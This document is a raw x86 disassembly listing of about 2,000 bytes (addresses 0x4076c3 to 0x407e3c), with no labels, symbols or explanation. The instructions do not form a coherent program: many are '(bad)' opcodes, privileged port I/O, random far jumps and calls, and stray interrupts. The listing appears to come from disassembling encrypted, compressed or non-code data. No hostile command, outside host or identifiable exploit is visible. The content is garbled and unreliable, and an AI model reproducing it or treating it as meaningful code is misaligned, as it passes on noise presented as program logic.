  4076c3:	data16 fisttp DWORD PTR ds:0x27f115b1
  4076ca:	inc    eax
  4076cb:	sub    DWORD PTR [ebx],0x7bce7457
  4076d1:	mov    dl,0xcb
  4076d3:	(bad)  
  4076d4:	jmp    0x2ef4ae83
  4076d9:	xchg   edi,eax
  4076da:	clc    
  4076db:	xor    eax,0x2182caca
  4076e0:	dec    esi
  4076e1:	xor    BYTE PTR [edx+eax*4],al
  4076e4:	repnz aam 0xea
  4076e7:	mov    ebp,0x7a99d406
  4076ec:	out    dx,al
  4076ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076ee:	dec    ebx
  4076ef:	in     al,dx
  4076f0:	loopne 0x40769a
  4076f2:	pop    ebp
  4076f3:	push   edi
  4076f4:	retf   
  4076f5:	and    eax,DWORD PTR [edi+ebx*8+0x5569d5b2]
  4076fc:	inc    esp
  4076fd:	call   0xc8ac:0x8ad6815e
  407704:	mov    ch,0x8f
  407706:	or     BYTE PTR [ebp-0x6b],bl
  407709:	xor    ebp,eax
  40770b:	xchg   ebx,eax
  40770c:	ins    DWORD PTR es:[edi],dx
  40770d:	into   
  40770e:	fwait
  40770f:	arpl   ax,ax
  407711:	sahf   
  407712:	shl    BYTE PTR [ebp+0x12],cl
  407715:	xlat   BYTE PTR ds:[ebx]
  407716:	mov    ch,0x96
  407718:	xchg   ecx,eax
  407719:	div    al
  40771b:	adc    ah,dl
  40771d:	xchg   esi,eax
  40771e:	mov    bh,dh
  407720:	stos   DWORD PTR es:[edi],eax
  407721:	mov    DWORD PTR [ebx+eax*2],esi
  407724:	ret    0xae36
  407727:	sub    BYTE PTR [edi+0x6ee9481],dh
  40772d:	out    dx,eax
  40772e:	mov    cl,0x95
  407730:	jg     0x4077a6
  407732:	jno    0x407753
  407734:	sub    esi,edx
  407736:	xchg   ebp,eax
  407737:	std    
  407738:	ret    
  407739:	mov    edx,DWORD PTR [edi-0x2a8d8cf7]
  40773f:	push   0xffffff96
  407741:	xchg   esi,eax
  407742:	ins    BYTE PTR es:[edi],dx
  407743:	bnd jmp 0x40774d
  407746:	push   eax
  407747:	xchg   esi,eax
  407748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407749:	xchg   DWORD PTR [eax],esi
  40774b:	icebp  
  40774c:	ins    BYTE PTR es:[edi],dx
  40774d:	pop    ss
  40774e:	aas    
  40774f:	or     edi,DWORD PTR [esi]
  407751:	repnz imul edi,DWORD PTR [esi+0x3c1511a1],0xfffffffb
  407759:	inc    eax
  40775a:	push   eax
  40775b:	mov    ebx,0x96ed3b50
  407760:	js     0x4077a6
  407762:	std    
  407763:	sbb    ecx,ebx
  407765:	xchg   BYTE PTR [esi],bh
  407767:	sub    BYTE PTR [edx-0x5e],cl
  40776a:	jo     0x407748
  40776c:	xchg   ebp,edi
  40776e:	icebp  
  40776f:	sub    eax,0x509cd9c7
  407774:	push   ebp
  407775:	adc    eax,0x4c923cec
  40777a:	sahf   
  40777b:	pop    ds
  40777c:	cli    
  40777d:	xor    al,0x3c
  40777f:	lods   eax,DWORD PTR ds:[esi]
  407780:	popf   
  407781:	ror    BYTE PTR [ecx-0x6cb6772a],0xa2
  407788:	loopne 0x407754
  40778a:	lock shl DWORD PTR [eax-0x80],cl
  40778e:	daa    
  40778f:	hlt    
  407790:	xor    BYTE PTR [eax-0x58],dl
  407793:	(bad)  
  407794:	fnstenv [eax+0x38]
  407797:	js     0x407746
  407799:	mov    ecx,0x11bad8e5
  40779e:	and    ebp,ebx
  4077a0:	fs test ebp,ebp
  4077a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077a4:	adc    BYTE PTR [esi+0x36],dl
  4077a7:	xchg   edx,eax
  4077a8:	bswap  ebp
  4077aa:	mov    ah,0xc5
  4077ac:	dec    esp
  4077ad:	loope  0x407814
  4077af:	jmp    0xd59e2b93
  4077b4:	cli    
  4077b5:	fwait
  4077b6:	mov    esp,DWORD PTR [esp+edi*8+0x6adc4a4a]
  4077bd:	pop    esp
  4077be:	ja     0x4077b0
  4077c0:	inc    esp
  4077c1:	mov    ebp,0xe74533f0
  4077c6:	retf   
  4077c7:	xchg   edx,eax
  4077c8:	fcomip st,st(4)
  4077ca:	and    eax,0xbed7aad
  4077cf:	test   eax,0x337e6ccc
  4077d4:	sbb    dl,dh
  4077d6:	dec    eax
  4077d7:	xor    eax,edx
  4077d9:	(bad)  
  4077da:	nop
  4077db:	mov    ebp,0x6b2a6814
  4077e0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077e2:	push   0xf72a7159
  4077e7:	push   0xffffff9e
  4077e9:	add    al,0xab
  4077eb:	adc    BYTE PTR [edx+0x29],ah
  4077ee:	sahf   
  4077ef:	outs   dx,BYTE PTR ds:[esi]
  4077f0:	jae    0x4077d2
  4077f2:	push   ss
  4077f3:	mov    ds,edi
  4077f5:	sbb    DWORD PTR [ecx+0x5f5771eb],ebx
  4077fb:	sbb    DWORD PTR [esi],edi
  4077fd:	and    DWORD PTR [edi+0x63efc6a2],ebx
  407803:	rcl    BYTE PTR [esi+0x24418e62],1
  407809:	mov    ds:0x21d9fccc,al
  40780e:	fcmovne st,st(0)
  407810:	rcl    ch,cl
  407812:	xchg   edi,eax
  407813:	mov    ?,ebx
  407815:	and    eax,0x24ed5451
  40781a:	pop    eax
  40781b:	ds in  al,dx
  40781d:	lods   eax,DWORD PTR ds:[esi]
  40781e:	out    0xdc,al
  407820:	scas   eax,DWORD PTR es:[edi]
  407821:	mov    ecx,0x4c204a16
  407826:	into   
  407827:	ss loopne 0x407872
  40782a:	sbb    DWORD PTR [ebx+0x68],esi
  40782d:	pop    ecx
  40782e:	shl    BYTE PTR [ecx+0x49f558ae],0xda
  407835:	mov    DWORD PTR [eax+0x53],edx
  407838:	mov    esp,0x2dfb27
  40783d:	loopne 0x4077bf
  40783f:	inc    edi
  407840:	push   cs
  407841:	xchg   esp,eax
  407842:	cld    
  407843:	jns    0x4077da
  407845:	sbb    ah,bh
  407847:	sahf   
  407848:	lods   eax,DWORD PTR ds:[esi]
  407849:	retf   
  40784a:	imul   DWORD PTR [edx]
  40784c:	aaa    
  40784d:	fmul   DWORD PTR [ecx+0x24ae00ec]
  407853:	or     bh,ah
  407855:	mov    eax,ds:0x1d69ffbe
  40785a:	aam    0x89
  40785c:	mov    bx,0xc747
  407860:	sub    ecx,DWORD PTR [edx+0x5f]
  407863:	iret   
  407864:	add    BYTE PTR [edi-0x274f2a0a],0x12
  40786b:	outs   dx,DWORD PTR ds:[esi]
  40786c:	add    al,0xc5
  40786e:	add    al,0x1d
  407870:	push   ss
  407871:	xlat   BYTE PTR ds:[ebx]
  407872:	and    ebp,ebp
  407874:	push   ds
  407875:	xor    dh,BYTE PTR [esi-0x9]
  407878:	mov    al,cl
  40787a:	push   ss
  40787b:	mov    ah,BYTE PTR [esi+0x78]
  40787e:	dec    ebp
  40787f:	mov    cl,0xb4
  407881:	scas   al,BYTE PTR es:[edi]
  407882:	and    ebx,DWORD PTR [ebp+0x403b39ef]
  407888:	aas    
  407889:	pop    eax
  40788a:	imul   edi,DWORD PTR [eax-0x40],0x4a759eb6
  407891:	imul   ecx,DWORD PTR [edi-0x22],0x2d
  407895:	jle    0x40788e
  407897:	sahf   
  407898:	jmp    0x407900
  40789a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40789b:	je     0x4078e9
  40789d:	inc    ebp
  40789e:	sbb    eax,DWORD PTR [eax+edx*4-0x1051c05c]
  4078a5:	out    0xf1,eax
  4078a7:	nop
  4078a8:	mov    ds:0x472a8343,al
  4078ad:	inc    esi
  4078ae:	jmp    0xe6d4:0xd7203fcd
  4078b5:	ret    0x992a
  4078b8:	inc    ecx
  4078b9:	sar    BYTE PTR [ebx-0x2f],1
  4078bc:	mov    dl,0xff
  4078be:	or     bl,BYTE PTR [edi+esi*8]
  4078c1:	lahf   
  4078c2:	pop    edx
  4078c3:	(bad)  
  4078c4:	push   cs
  4078c5:	push   0x7cafecad
  4078ca:	dec    ecx
  4078cb:	jo     0x4078e7
  4078cd:	mov    DWORD PTR [ebx+0x25744e21],ebp
  4078d3:	sbb    ebx,ebp
  4078d5:	jnp    0x4078d7
  4078d7:	dec    DWORD PTR [edi]
  4078d9:	aas    
  4078da:	outs   dx,BYTE PTR ds:[esi]
  4078db:	lods   al,BYTE PTR ds:[esi]
  4078dc:	ins    BYTE PTR es:[edi],dx
  4078dd:	mov    DWORD PTR [edx-0x56009d06],ebx
  4078e3:	jo     0x407937
  4078e5:	int3   
  4078e6:	adc    eax,DWORD PTR [edi-0x28]
  4078e9:	fnstsw WORD PTR [eax+0x7781b9d2]
  4078ef:	imul   ecx,edx,0x7bb9707
  4078f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f6:	fsub   st,st(5)
  4078f8:	pusha  
  4078f9:	aam    0x2
  4078fb:	mov    ch,0x74
  4078fd:	int3   
  4078fe:	xchg   DWORD PTR [edi],esp
  407900:	jg     0x40789d
  407902:	push   cs
  407903:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  407905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407906:	jne    0x40790e
  407908:	sub    eax,0x4133dd6a
  40790d:	pop    es
  40790e:	pop    edx
  40790f:	push   ebp
  407910:	jmp    0x5dc9:0x9419ba95
  407917:	cmc    
  407918:	test   DWORD PTR [esi+0x498daa6a],esp
  40791e:	fadd   DWORD PTR [esi+ecx*8-0x2bc708e9]
  407925:	sbb    DWORD PTR [esi],ebp
  407927:	ins    DWORD PTR es:[edi],dx
  407928:	xor    al,0x28
  40792a:	ss stos DWORD PTR es:[edi],eax
  40792c:	inc    edx
  40792d:	and    eax,0x1f802973
  407932:	inc    ebx
  407933:	push   edi
  407934:	dec    ecx
  407935:	das    
  407936:	ss retf 0x75d4
  40793a:	call   0x144aeae6
  40793f:	ins    DWORD PTR es:[edi],dx
  407940:	ret    
  407941:	adc    al,0x1f
  407943:	dec    DWORD PTR [edx+ebp*4-0x2f]
  407947:	jbe    0x40799d
  407949:	cmp    al,0x5a
  40794b:	fstp   st(5)
  40794d:	fcom   DWORD PTR [ecx+edi*4-0x7f151efd]
  407954:	sub    BYTE PTR [eax],al
  407956:	ins    DWORD PTR es:[edi],dx
  407957:	(bad)  cs:[esi+ecx*2-0x68]
  40795c:	mov    WORD PTR [ebx],?
  40795e:	jns    0x4078f9
  407960:	arpl   dx,sp
  407962:	jle    0x407921
  407964:	fistp  DWORD PTR [edx-0x56]
  407967:	xchg   edi,eax
  407968:	shl    DWORD PTR [edi],cl
  40796a:	es mov ah,0xe3
  40796d:	cmc    
  40796e:	or     al,BYTE PTR [edx]
  407970:	int3   
  407971:	cmc    
  407972:	dec    ebp
  407973:	leave  
  407974:	mov    ebx,DWORD PTR [esi]
  407976:	aad    0xfe
  407978:	sbb    bl,BYTE PTR [esi+0x4]
  40797b:	add    DWORD PTR [edx],ebx
  40797d:	test   eax,ebx
  40797f:	mov    ds:0x8da4c3ac,eax
  407984:	push   esp
  407985:	(bad)  
  407986:	xlat   BYTE PTR ds:[ebx]
  407987:	xor    edx,DWORD PTR [ebp+0x2c]
  40798a:	out    0x73,eax
  40798c:	mov    WORD PTR [esi-0x13ae21d8],gs
  407992:	inc    esp
  407993:	aad    0x21
  407995:	mov    cl,0x76
  407997:	pushf  
  407998:	fwait
  407999:	push   ebp
  40799a:	into   
  40799b:	push   edi
  40799c:	in     al,0xcb
  40799e:	mov    edx,0xec845358
  4079a3:	mov    esi,0xf6a2bc1b
  4079a8:	aaa    
  4079a9:	jge    0x4079cb
  4079ab:	fisttp DWORD PTR [esi+ebx*2+0x56e2d103]
  4079b2:	jnp    0x407a24
  4079b4:	xchg   eax,edx
  4079b6:	(bad)  
  4079b7:	idiv   esi
  4079b9:	xor    ebx,edi
  4079bb:	mov    ch,0xe0
  4079bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079be:	sbb    eax,DWORD PTR [eax+0x51]
  4079c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079c2:	clc    
  4079c3:	cmc    
  4079c4:	je     0x407997
  4079c6:	dec    ebp
  4079c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079c8:	outs   dx,BYTE PTR ds:[esi]
  4079c9:	jg     0x40797f
  4079cb:	sub    eax,0x530b6686
  4079d0:	test   eax,0xaae7b637
  4079d5:	xchg   edx,eax
  4079d6:	out    dx,eax
  4079d7:	jno    0x4079a3
  4079d9:	(bad)  
  4079da:	shl    DWORD PTR [eax+ebp*2],1
  4079dd:	dec    edi
  4079de:	out    dx,al
  4079df:	xchg   ebp,eax
  4079e0:	fwait
  4079e1:	or     al,0x90
  4079e3:	sbb    al,0x32
  4079e5:	daa    
  4079e6:	adc    dl,BYTE PTR [esi]
  4079e8:	push   edi
  4079e9:	mov    WORD PTR [edi+0x1c7051d4],?
  4079ef:	popa   
  4079f0:	pop    edi
  4079f1:	fild   DWORD PTR [eax+edx*2]
  4079f4:	mov    ah,0x50
  4079f6:	lods   al,BYTE PTR ds:[esi]
  4079f7:	add    DWORD PTR [esi-0x6a],0x2d
  4079fb:	xchg   edx,eax
  4079fc:	inc    edi
  4079fd:	je     0x407a3a
  4079ff:	mov    esp,0x52c4ea7d
  407a04:	(bad)  
  407a05:	jns    0x40799f
  407a07:	and    cl,BYTE PTR [ebp+0x50]
  407a0a:	addr16 mov ds:0xc1b2,eax
  407a0e:	xchg   edx,eax
  407a0f:	out    0x39,al
  407a11:	dec    esp
  407a12:	xor    al,ch
  407a14:	ins    DWORD PTR es:[edi],dx
  407a15:	dec    eax
  407a16:	pop    edi
  407a17:	push   0xc82fda12
  407a1c:	mov    gs,edi
  407a1e:	sub    eax,0xc17f5524
  407a23:	push   edx
  407a24:	xchg   BYTE PTR [ebp+0x46],dl
  407a27:	loope  0x4079c7
  407a29:	push   ss
  407a2a:	adc    dl,BYTE PTR [esi+0x6993c78e]
  407a30:	add    al,0x25
  407a32:	cld    
  407a33:	lds    edi,FWORD PTR [ebx+0x3b]
  407a36:	mov    BYTE PTR [edx],bh
  407a38:	sub    DWORD PTR ds:0xca9f3f0f,ecx
  407a3e:	mov    edx,0xdcdad43c
  407a43:	lods   al,BYTE PTR ds:[esi]
  407a44:	pop    edx
  407a45:	(bad)  
  407a46:	aad    0xf8
  407a48:	js     0x407a8e
  407a4a:	mov    dh,0x99
  407a4c:	mov    bh,0x4c
  407a4e:	stc    
  407a4f:	mov    ah,0x86
  407a51:	test   al,0x0
  407a53:	aad    0x92
  407a55:	jbe    0x407a90
  407a57:	fwait
  407a58:	push   0xffffffa0
  407a5a:	cmp    BYTE PTR [ebp+ecx*4-0x3722d850],bl
  407a61:	dec    ebx
  407a62:	push   ss
  407a63:	sub    bh,BYTE PTR [eax+0x25]
  407a66:	mov    ebp,0xe491de1c
  407a6b:	nop
  407a6c:	dec    esp
  407a6d:	inc    eax
  407a6e:	mov    ebx,0xb700c9db
  407a73:	adc    DWORD PTR [eax-0x2fbe5cf5],0x63
  407a7a:	mov    eax,0x641d2257
  407a7f:	js     0x407a9b
  407a81:	dec    edi
  407a82:	sub    ah,ch
  407a84:	rol    dl,0xe
  407a87:	inc    esp
  407a88:	add    eax,0x742a2438
  407a8d:	arpl   WORD PTR [eax-0x108cf432],cx
  407a93:	inc    ecx
  407a94:	mov    bl,0x43
  407a96:	sub    ch,cl
  407a98:	or     al,BYTE PTR [eax-0x34]
  407a9b:	mov    ch,0xa
  407a9d:	xor    al,0x2d
  407a9f:	adc    al,0x80
  407aa1:	sbb    eax,0xee25cd06
  407aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa7:	and    BYTE PTR [ecx-0x3f],bl
  407aaa:	mov    ecx,edi
  407aac:	adc    al,0xec
  407aae:	nop
  407aaf:	xchg   esi,eax
  407ab0:	or     eax,0xa270355
  407ab5:	push   edx
  407ab6:	push   eax
  407ab7:	loopne 0x407a9a
  407ab9:	sub    cl,BYTE PTR [ebx+0x60712651]
  407abf:	push   ebx
  407ac0:	xchg   ebx,eax
  407ac1:	cld    
  407ac2:	rol    edi,cl
  407ac4:	pop    esi
  407ac5:	mov    edi,0x569e6490
  407aca:	int    0xe
  407acc:	loopne 0x407a5a
  407ace:	sbb    dl,BYTE PTR [edx+0x35]
  407ad1:	int3   
  407ad2:	push   0x3b02469f
  407ad7:	fdivr  st,st(7)
  407ad9:	addr16 das 
  407adb:	cs mov esp,esp
  407ade:	mov    ebp,0xce699ef4
  407ae3:	xchg   ebp,eax
  407ae4:	retf   
  407ae5:	cmp    eax,0x3deac440
  407aea:	int3   
  407aeb:	mov    eax,ds:0xc8d53a3c
  407af0:	xchg   edi,eax
  407af1:	jmp    0x407aab
  407af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af4:	push   eax
  407af5:	push   ecx
  407af6:	jle    0x407ae3
  407af8:	or     eax,0x4ed4e813
  407afd:	mov    bh,BYTE PTR [ecx-0x20]
  407b00:	int3   
  407b01:	icebp  
  407b02:	pop    edi
  407b03:	mov    edx,0x2eb6f94f
  407b08:	sbb    edx,edx
  407b0a:	or     BYTE PTR [edx],dl
  407b0c:	push   esi
  407b0d:	ss adc eax,0x686c92a6
  407b13:	sub    BYTE PTR [eax+0x1b],dh
  407b16:	pop    ss
  407b17:	adc    BYTE PTR [edi+ebx*4-0x63c32c58],bl
  407b1e:	push   ds
  407b1f:	les    ebp,FWORD PTR [edi-0x5bd7d88b]
  407b25:	sbb    DWORD PTR [esp+edx*2+0x5876ec74],esi
  407b2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2d:	sub    eax,0xfec54056
  407b32:	int    0xae
  407b34:	or     al,0xe4
  407b36:	cmp    ah,BYTE PTR [edx+0x1c]
  407b39:	shl    dl,cl
  407b3b:	push   0xb266cc39
  407b40:	xchg   edx,eax
  407b41:	fstp   DWORD PTR [edi+0x35]
  407b44:	lahf   
  407b45:	mov    esp,0xa2d77588
  407b4a:	xor    DWORD PTR [ebp+0x43],edx
  407b4d:	mov    ah,0x58
  407b4f:	mov    ah,0xb4
  407b51:	cli    
  407b52:	outs   dx,DWORD PTR ds:[esi]
  407b53:	fidiv  DWORD PTR [ebp+0x58]
  407b56:	into   
  407b57:	cwde   
  407b58:	dec    DWORD PTR [ecx+0x13]
  407b5b:	mov    bl,0x11
  407b5d:	popf   
  407b5e:	dec    ebp
  407b5f:	dec    ecx
  407b60:	inc    esi
  407b61:	fdiv   QWORD PTR [edi]
  407b63:	rcl    DWORD PTR [edx],0x98
  407b66:	push   es
  407b67:	jb     0x407bc5
  407b69:	cld    
  407b6a:	imul   esp,DWORD PTR [eax+edi*1-0x4a],0x69
  407b6f:	das    
  407b70:	jmp    0xca35:0x1c1f6d92
  407b77:	ret    
  407b78:	jb     0x407bb8
  407b7a:	pushf  
  407b7b:	dec    ebx
  407b7c:	pop    edx
  407b7d:	inc    edx
  407b7e:	and    BYTE PTR [edi+0x78],bl
  407b81:	fistp  WORD PTR [esi+0x72b0a591]
  407b87:	int    0x71
  407b89:	jmp    0x3ebb:0x85dadca8
  407b90:	in     al,dx
  407b91:	xor    BYTE PTR [ebx+esi*2-0x49cf4f3a],0xd2
  407b99:	cmp    al,0xf
  407b9b:	mov    BYTE PTR [ebx],dh
  407b9d:	in     eax,dx
  407b9e:	jg     0x407c04
  407ba0:	sbb    ebp,DWORD PTR [ebp-0xd8c47f6]
  407ba6:	fisttp DWORD PTR ds:0x87024689
  407bac:	push   cs
  407bad:	bnd jg 0x407b75
  407bb0:	jle    0x407beb
  407bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bb3:	call   0x5d7f:0xc5f41591
  407bba:	dec    edi
  407bbb:	mov    al,ds:0x83dce57c
  407bc0:	dec    esp
  407bc1:	lock in eax,dx
  407bc3:	jge    0x407b96
  407bc5:	pop    ds
  407bc6:	pop    esi
  407bc7:	call   0x28b6:0x7672532f
  407bce:	and    eax,DWORD PTR [edx]
  407bd0:	dec    esp
  407bd1:	or     DWORD PTR ds:0xfb649033,eax
  407bd7:	fcom   DWORD PTR [esi+0x268f8b0e]
  407bdd:	mov    esi,0x36738894
  407be2:	add    BYTE PTR [edx+0x51],0xf1
  407be6:	lea    eax,[edx+0x1e164f5f]
  407bec:	mov    eax,ds:0x6cec0572
  407bf1:	xchg   edx,eax
  407bf2:	add    DWORD PTR [esi],ebx
  407bf4:	ss mov ebp,0xf0b8d3fb
  407bfa:	stc    
  407bfb:	add    bl,BYTE PTR [edx-0x11]
  407bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bff:	push   0x1d
  407c01:	xchg   ebx,eax
  407c02:	cmc    
  407c03:	jmp    0x89e845fd
  407c08:	jecxz  0x407c33
  407c0a:	aaa    
  407c0b:	jb     0x407bbe
  407c0d:	std    
  407c0e:	and    al,0xae
  407c10:	push   eax
  407c11:	or     dl,BYTE PTR [ebp-0x5dd3151]
  407c17:	inc    esp
  407c18:	cmp    DWORD PTR [eax],eax
  407c1a:	test   ah,ch
  407c1c:	inc    edi
  407c1d:	imul   esi,DWORD PTR [edi],0x41
  407c20:	or     dl,BYTE PTR [edx]
  407c22:	cmp    BYTE PTR [ebx],dh
  407c24:	arpl   WORD PTR [ebp-0x4c],cx
  407c27:	xor    al,0x90
  407c29:	push   esp
  407c2a:	sbb    BYTE PTR [esi+0x50],dh
  407c2d:	icebp  
  407c2e:	(bad)  
  407c2f:	leave  
  407c30:	add    al,0x8
  407c32:	push   ds
  407c33:	mov    ecx,0x940c2219
  407c38:	jae    0x407c9d
  407c3a:	fadd   QWORD PTR [ebx]
  407c3c:	pop    esi
  407c3d:	pop    ds
  407c3e:	(bad)  
  407c41:	xchg   ebx,edx
  407c43:	mov    BYTE PTR [ebp+edi*4+0x63343582],dh
  407c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c4b:	mov    al,ds:0xbff31dd6
  407c50:	out    0xce,al
  407c52:	dec    eax
  407c53:	xor    eax,0x5e38aaf1
  407c58:	add    cl,dl
  407c5a:	cld    
  407c5b:	fs inc ebp
  407c5d:	mov    WORD PTR [eax-0x6d043c56],cs
  407c63:	mov    DWORD PTR [ebx+0x16],0xf2c3d87c
  407c6a:	mov    ebx,DWORD PTR [eax-0x3e33d577]
  407c70:	sti    
  407c71:	pusha  
  407c72:	cld    
  407c73:	(bad)  
  407c74:	cli    
  407c75:	std    
  407c76:	mov    dl,al
  407c78:	pushf  
  407c79:	(bad)  
  407c7a:	scas   eax,DWORD PTR es:[edi]
  407c7b:	sbb    DWORD PTR [edx],esi
  407c7d:	daa    
  407c7e:	pop    esi
  407c7f:	stos   DWORD PTR es:[edi],eax
  407c80:	adc    dh,BYTE PTR [eax-0x33]
  407c83:	call   0x17b4:0xa725c5b9
  407c8a:	xchg   edx,eax
  407c8b:	int3   
  407c8c:	popa   
  407c8d:	stc    
  407c8e:	xor    dh,BYTE PTR [eax+0x59]
  407c91:	push   ebp
  407c92:	or     edi,esp
  407c94:	pop    eax
  407c95:	adc    BYTE PTR [ebx+eiz*1],0x64
  407c99:	cmp    bh,dl
  407c9b:	mov    ebx,0x2f4c6416
  407ca0:	ss jmp 0x3e021dec
  407ca6:	mov    bl,BYTE PTR [eax+esi*1+0x4]
  407caa:	push   ebp
  407cab:	sbb    edx,DWORD PTR [ebx-0x6c]
  407cae:	pushf  
  407caf:	frstor [edx+0x44]
  407cb2:	in     eax,dx
  407cb3:	in     eax,0xba
  407cb5:	pop    ss
  407cb6:	in     al,0xc
  407cb8:	aaa    
  407cb9:	leave  
  407cba:	cmp    al,0x1f
  407cbc:	fs xor eax,0xaf5f9bda
  407cc2:	ds stos BYTE PTR es:[edi],al
  407cc4:	xchg   ebp,eax
  407cc5:	push   esp
  407cc6:	jae    0x407d15
  407cc8:	in     eax,0x6a
  407cca:	dec    ecx
  407ccb:	push   esi
  407ccc:	mov    ds:0xce65b9e3,eax
  407cd1:	cmp    BYTE PTR [ecx+0x27],ah
  407cd4:	mov    al,0xa4
  407cd6:	fist   WORD PTR [ecx+0x5d6ab1e4]
  407cdc:	xor    DWORD PTR [edx-0x7da99937],ecx
  407ce2:	es and eax,0x4e2f75ac
  407ce8:	cwde   
  407ce9:	add    BYTE PTR [esi],dh
  407ceb:	test   DWORD PTR [eax],eax
  407ced:	xchg   esp,eax
  407cee:	daa    
  407cef:	jnp    0x407d1c
  407cf1:	push   ecx
  407cf2:	lods   al,BYTE PTR ds:[esi]
  407cf3:	stos   DWORD PTR es:[edi],eax
  407cf4:	pop    ebx
  407cf5:	out    0x4f,al
  407cf7:	ins    DWORD PTR es:[edi],dx
  407cf8:	test   al,0x15
  407cfa:	dec    edi
  407cfb:	sbb    dl,BYTE PTR es:[esp+esi*4+0x26]
  407d00:	sub    edi,ebx
  407d02:	pop    edx
  407d03:	cmp    al,0xe7
  407d05:	xchg   BYTE PTR [edx-0x6305a930],bl
  407d0b:	retf   
  407d0c:	cmp    dl,bl
  407d0e:	ss ja  0x407ca8
  407d11:	add    bl,BYTE PTR [ebx]
  407d13:	les    ebx,FWORD PTR [esi+0x2c]
  407d16:	dec    ebx
  407d17:	xor    BYTE PTR [ebp-0x1adab5aa],al
  407d1d:	fcmovne st,st(6)
  407d1f:	dec    esi
  407d20:	mov    edi,0xbbcdb8ef
  407d25:	sbb    DWORD PTR [esi-0xf1a4370],esi
  407d2b:	ret    
  407d2c:	and    BYTE PTR [ebx+0x2f],0x39
  407d30:	loop   0x407cbd
  407d32:	mov    dh,0x30
  407d34:	jmp    0x3686de79
  407d39:	jnp    0x407d29
  407d3b:	fst    DWORD PTR [eax]
  407d3d:	jb     0x407d89
  407d3f:	inc    esp
  407d40:	sbb    ch,dh
  407d42:	jp     0x407d5d
  407d44:	and    DWORD PTR [edx],eax
  407d46:	ret    0xed8
  407d49:	pop    ebp
  407d4a:	rcl    DWORD PTR [edi-0x22],cl
  407d4d:	fwait
  407d4e:	dec    ebp
  407d4f:	push   0x772524f8
  407d54:	pop    ecx
  407d55:	outs   dx,BYTE PTR ds:[esi]
  407d56:	sub    esi,ecx
  407d58:	xchg   ebx,eax
  407d59:	jmp    0x3fca3e74
  407d5e:	mov    ebp,0x1198ffa1
  407d63:	in     eax,dx
  407d64:	mov    esp,0x3a992c91
  407d69:	mov    edx,DWORD PTR [ebx]
  407d6b:	jae    0x407de2
  407d6d:	sub    bl,BYTE PTR [edi-0x50]
  407d70:	sub    dl,0xdf
  407d73:	rol    DWORD PTR es:[edx+0x20f913fb],0xdd
  407d7b:	push   es
  407d7c:	(bad)  
  407d7e:	aas    
  407d7f:	sti    
  407d80:	jp     0x407d37
  407d82:	outs   dx,BYTE PTR ds:[esi]
  407d83:	aaa    
  407d84:	add    al,BYTE PTR [ecx+0x4]
  407d87:	jb     0x407df9
  407d89:	cmc    
  407d8a:	sub    esi,DWORD PTR [eax]
  407d8c:	imul   edx,ebx,0x4ec62d30
  407d92:	or     al,0x4e
  407d94:	test   BYTE PTR [ebp+0x4e2ffca7],0xb2
  407d9b:	out    0x8b,eax
  407d9d:	jno    0x407d55
  407d9f:	loope  0x407d57
  407da1:	pop    ebx
  407da2:	test   al,0xc2
  407da4:	jg     0x407d5a
  407da6:	mov    dl,BYTE PTR [ecx]
  407da8:	sahf   
  407da9:	push   0x8efc235b
  407dae:	clc    
  407daf:	inc    edi
  407db0:	mov    BYTE PTR [ebx-0x6b260d10],0xb7
  407db7:	push   ebp
  407db8:	int3   
  407db9:	xchg   ebp,eax
  407dba:	add    eax,0xf5b3b4ae
  407dbf:	push   esp
  407dc0:	sub    eax,0x7123c307
  407dc5:	loope  0x407e09
  407dc7:	retf   0x5e5b
  407dca:	lock dec ebp
  407dcc:	ins    BYTE PTR es:[edi],dx
  407dcd:	push   eax
  407dce:	cs pop ss
  407dd0:	nop
  407dd1:	pop    edi
  407dd2:	push   ds
  407dd3:	xlat   BYTE PTR ds:[ebx]
  407dd4:	cmp    ebp,DWORD PTR [edi-0x4c34b2e8]
  407dda:	sbb    BYTE PTR [ecx-0x5b83a3e0],bl
  407de0:	pop    ebp
  407de1:	rol    DWORD PTR [edi+0x458437b],1
  407de7:	test   eax,0x5bd4fd38
  407dec:	jmp    0x407d95
  407dee:	add    bh,BYTE PTR [ebp-0x4178d36b]
  407df4:	dec    edi
  407df5:	in     al,dx
  407df6:	push   ebp
  407df7:	je     0x407d7b
  407df9:	(bad)  
  407dfa:	repnz cmp dl,ch
  407dfd:	push   es
  407dfe:	ds cdq 
  407e00:	sbb    eax,0xa0f926c
  407e05:	mov    ecx,DWORD PTR [ebp-0x4b2b095b]
  407e0b:	in     al,0x2b
  407e0d:	ins    BYTE PTR es:[edi],dx
  407e0e:	ror    DWORD PTR [ecx+0x42],cl
  407e11:	jle    0x407e87
  407e13:	out    dx,eax
  407e14:	jg     0x407e92
  407e16:	mov    ?,WORD PTR [edx-0x2e]
  407e19:	int3   
  407e1a:	in     al,0xea
  407e1c:	repz push ebp
  407e1e:	mov    dl,0x55
  407e20:	inc    eax
  407e21:	(bad)  
  407e22:	dec    DWORD PTR [edx-0x33]
  407e25:	in     al,0x61
  407e27:	fwait
  407e28:	repnz (bad) 
  407e2a:	mov    eax,0x6fc21a3b
  407e2f:	fucomi st,st(2)
  407e31:	fdiv   QWORD PTR [edi]
  407e33:	mov    ?,WORD PTR [ecx-0x66]
  407e36:	sahf   
  407e37:	sbb    esi,DWORD PTR [edx+0x69]
  407e3a:	lock scas eax,DWORD PTR es:[edi]
  407e3c:	ja     0x407ebb
